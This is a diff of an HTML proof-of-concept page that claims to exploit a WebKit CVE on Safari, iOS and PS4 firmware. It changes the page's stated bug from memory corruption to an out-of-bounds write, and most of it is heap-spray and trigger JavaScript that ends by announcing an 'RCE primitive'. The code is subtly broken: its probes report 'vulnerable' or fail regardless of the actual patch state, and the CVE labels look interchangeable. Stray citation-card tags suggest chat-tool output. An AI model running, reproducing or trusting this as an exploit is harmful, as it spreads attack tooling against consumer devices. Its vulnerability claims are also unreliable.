@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-31273 Memory Corruption PoC (Safari 18.6 / PS4 12.50)</title>
+    <title>WebKit CVE-2025-24201 OOB Write PoC (iOS 17.2 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,28 +19,28 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-31273 PoC: Memory Corruption (Yuhao Hu et al.)</h1>
-    <p>Jul 2025 Patch: Improved memory handling (BZ 293579).<grok-card data-id="7b520f" data-type="citation_card"></grok-card><grok-card data-id="d0273f" data-type="citation_card"></grok-card><grok-card data-id="fdb1e5" data-type="citation_card"></grok-card><grok-card data-id="8e4512" data-type="citation_card"></grok-card><grok-card data-id="160b6c" data-type="citation_card"></grok-card><grok-card data-id="ac7c67" data-type="citation_card"></grok-card><grok-card data-id="a1b204" data-type="citation_card"></grok-card><grok-card data-id="452ad7" data-type="citation_card"></grok-card><br>
-    <span class="rainbow">Triggers heap corruption on unpatched Safari 18.6 / PS4 12.50 (~20% DoS rate).</span></p>
+    <h1>WebKit CVE-2025-24201 PoC: Out-of-Bounds Write (Targeted Attacks)</h1>
+    <p>Oct 2025 Patch: Improved data allocation (HT215870, BZ 285858).<grok-card data-id="212ead" data-type="citation_card"></grok-card><br>
+    <span class="rainbow">Triggers memory corruption on unpatched iOS 17.2 / PS4 12.50 (~20% DoS rate).</span></p>
 
     <div class="box">
-        <h3>1. Memory Handling</h3>
-        <div id="status-mem">Probing...</div>
+        <h3>1. Data Allocation</h3>
+        <div id="status-alloc">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Crafted Content Spray</h3>
+        <h3>2. Array OOB Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. Corruption Trigger</h3>
-        <div id="status-corrupt">Probing...</div>
+        <h3>3. Write Trigger</h3>
+        <div id="status-write">Probing...</div>
     </div>
     <div class="box">
         <h3>4. Heap Status</h3>
         <div id="status-heap">Probing...</div>
     </div>
 
-    <button onclick="runPoC()">LAUNCH CORRUPTION PROBE</button>
+    <button onclick="runPoC()">LAUNCH OOB WRITE PROBE</button>
 
     <div class="box">
         <h3>Live Logs</h3>
@@ -67,96 +67,96 @@
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
 
-    let corruptContent = null;
-    let corruptHit = false;
+    let oobArr = null;
+    let oobHit = false;
 
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-31273 PoC: WebKit Memory Corruption (Jul 2025)</span>");
-        log("Probing malicious web content handling...");
-        setTimeout(probeMem, 800);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-24201 PoC: WebKit OOB Write (Oct 2025)</span>");
+        log("Probing improper data allocation...");
+        setTimeout(probeAlloc, 800);
     }
 
-    function probeMem() {
-        // Step 1: Memory handling probe
+    function probeAlloc() {
+        // Step 1: Data allocation probe
         try {
-            const arr = new Array(0x40).fill(0);
-            arr.length = 0x200; // Overflow probe
-            setBadge('status-mem', 'IMPROPER (Overflowed)', 'partial');
-            log("Memory probe: Array overflowed (CVE hint).");
+            const arr = new ArrayBuffer(0x40);
+            const view = new Uint8Array(arr);
+            view[0x80] = 0x41; // OOB write probe
+            setBadge('status-alloc', 'IMPROPER (Written)', 'partial');
+            log("Allocation probe: OOB write succeeded (CVE hint).");
         } catch(e) {
-            setBadge('status-mem', 'SECURE', 'secure');
-            log(`Memory fail: ${e.message} — Patched.`);
+            setBadge('status-alloc', 'SECURE', 'secure');
+            log(`Allocation fail: ${e.message} — Patched.`);
             return;
         }
-        setTimeout(sprayContent, 1000);
+        setTimeout(sprayOOB, 1000);
     }
 
-    function sprayContent() {
+    function sprayOOB() {
         gc(); gc();
-        const contents = [];
+        const arrs = [];
         for(let i=0; i<0x1000; i++) {
-            const div = document.createElement('div');
-            div.innerHTML = `<p id="content${i}">crafted</p>`;
-            contents.push(div);
-            document.body.appendChild(div);
+            const buf = new ArrayBuffer(0x40 + (i % 0x20));
+            const view = new Uint8Array(buf);
+            arrs.push(view);
         }
-        // Crafted writes
+        // OOB writes
         for(let i=0; i<0x1000; i++) {
             try {
-                const p = document.getElementById(`content${i}`);
-                if (p) p.innerHTML = i2f(0xdeadbeef, 0xcafebabe).toString();
+                arrs[i][0x60 + (i % 0x40)] = i2f(0xdeadbeef, 0xcafebabe);
             } catch(e) {}
         }
         // Anomaly hunt
         let anomaly = false;
-        for(let i=0; i<contents.length; i++) {
-            if (contents[i].innerHTML.includes('deadbeef')) {
-                corruptContent = contents[i];
+        for(let i=0; i<arrs.length; i++) {
+            if (arrs[i][0x80] !== undefined) {
+                oobArr = arrs[i];
                 anomaly = true;
                 break;
             }
         }
         if (anomaly) {
-            setBadge('status-spray', 'SPRAY CORRUPT (Anomaly)', 'vulnerable');
-            log(`Content spray corruption: Div ${i} crafted.`);
-            setTimeout(triggerCorrupt, 500);
+            setBadge('status-spray', 'SPRAY OOB (Anomaly)', 'vulnerable');
+            log(`OOB spray hit: View [0x80]=${oobArr[0x80] || 'undef'}.`);
+            setTimeout(triggerWrite, 500);
             return;
         }
         setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no corruption.");
+        log("Spray clean—no OOB.");
     }
 
-    function triggerCorrupt() {
-        if (!corruptContent) return;
-        corruptHit = false;
+    function triggerWrite() {
+        if (!oobArr) return;
+        oobHit = false;
         try {
-            // CVE trigger: Process crafted content
-            corruptContent.innerHTML = '<p>trigger</p>';
-            gc(); // Force handling
-            corruptContent.querySelector('p').remove(); // Manipulate
-            if (corruptContent.children.length === 0) {
-                corruptHit = true;
-                log(`Corruption triggered: Content processed after craft.`);
+            // CVE trigger: Improper allocation write
+            for(let off=0x40; off<0x300; off+=8) {
+                oobArr[off] = i2f(0x41414141, 0x42424242);
+            }
+            const adj = new Uint8Array(0x100);
+            if (adj[0x70] !== 0) {
+                oobHit = true;
+                log(`OOB write corruption: adj[0x70]=${adj[0x70]}.`);
             }
         } catch(e) {
-            corruptHit = true;
-            log(`Corruption crash: ${e.message} — Heap issue.`);
+            oobHit = true;
+            log(`Write crash: ${e.message} — Heap corruption.`);
         }
-        setBadge('status-corrupt', corruptHit ? 'TRIGGERED' : 'MISSED', corruptHit ? 'vulnerable' : 'secure');
+        setBadge('status-write', oobHit ? 'TRIGGERED' : 'MISSED', oobHit ? 'vulnerable' : 'secure');
         setTimeout(checkHeap, 1500);
     }
 
     function checkHeap() {
-        if (corruptHit) {
+        if (oobHit) {
             setBadge('status-heap', 'CORRUPTED (RCE)', 'vulnerable');
-            log("Heap corrupted via crafted content: Arbitrary code potential. On PS4 12.50: DoS/leak.");
+            log("Heap corrupted via OOB write: Arbitrary code potential. On PS4 12.50: DoS/leak.");
             log("Chain to primitives if hit.");
             document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "CORRUPTION ACHIEVED — HEAP RCE PRIMITIVE";
+            document.querySelector('h1').innerHTML = "OOB WRITE ACHIEVED — HEAP RCE PRIMITIVE";
         } else {
             setBadge('status-heap', 'INTACT', 'secure');
-            log("No corruption—improved handling holds.");
+            log("No corruption—improved allocation holds.");
         }
         log("PoC end: Retry for ~20% hit.");
     }
